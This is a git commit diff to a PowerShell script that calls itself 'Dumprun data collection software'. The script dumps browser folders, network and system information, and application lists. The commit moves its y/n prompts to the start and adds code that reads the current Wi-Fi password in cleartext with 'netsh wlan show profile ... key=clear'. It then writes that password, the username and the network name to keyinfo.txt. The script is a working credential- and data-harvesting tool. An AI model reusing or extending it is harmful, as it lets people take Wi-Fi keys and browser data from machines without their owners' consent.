7e1940c7731257af9ca4c1190b26b60a189c4664
Mostafamabrok <mostafa.m.mabrok@gmail.com>
2023-08-27 21:12:45 +0300

    Moved all read-host choices to the beginning added some intro text for config

--- main.ps1
+++ main.ps1
@@ -3,6 +3,13 @@ mkdir dumped/edge -Force #All the MS edge data is stored here.
 mkdir dumped/chrome -Force #All Google Chrome data is stored here.
 mkdir dumped/wantedfolder -Force #Desired Path contents are stored here.
 
+Write-Host "Starting Dumprun data collection software pre-run configuration."
+Write-Host "Would you like copy a folder during running? (y/n)"
+$copy_permission = Read-Host 
+Write-Host "Would you like a keyinfo.txt file to be generated? (y/n)"
+$key_info_permission = Read-Host
+Write-Host "Configuration Complete. Initiating data collection"
+
 #Below is just standard system and network info.
 arp -a > dumped/iplist.txt 
 ipconfig > dumped/ipconfig.txt 
@@ -14,8 +21,10 @@ Get-ChildItem -Path "C:\Program Files" | Select-Object Name > dumped/applist.txt
 Get-ChildItem -Path "C:\Program Files (x86)" | Select-Object Name > dumped/applist86.txt
 
 
+
 #This gets network information by checking the network name and getting the info based on that.
 $networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name 
+$networkpassword=Netsh wlan show profile name=$networkname key=clear |findstr "Key Content"
 Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
 
 
@@ -42,9 +51,6 @@ catch {
 }
 
 
-Write-Host "Do you want to copy a folder? (y/n):"
-$copy_permission = Read-Host #This variable asks for input of the user which could be y or n. This is used in the coming if-statement
-
 if ($copy_permission -eq "y") {
     #Asks user for desired path to copy and then copies it and its contents.
     Write-Output "Write your desired path to copy:"
@@ -57,3 +63,9 @@ if ($copy_permission -eq "n"){
     Write-Host "Continuing on with the program."
 }
 
+
+if ($key_info_permission -eq "y"){
+    "User name: $Env:UserName" > dumped/keyinfo.txt
+    "Network name: $networkname" >> dumped/keyinfo.txt
+    "Network Password: $networkpassword" >> dumped/keyinfo.txt 
+}
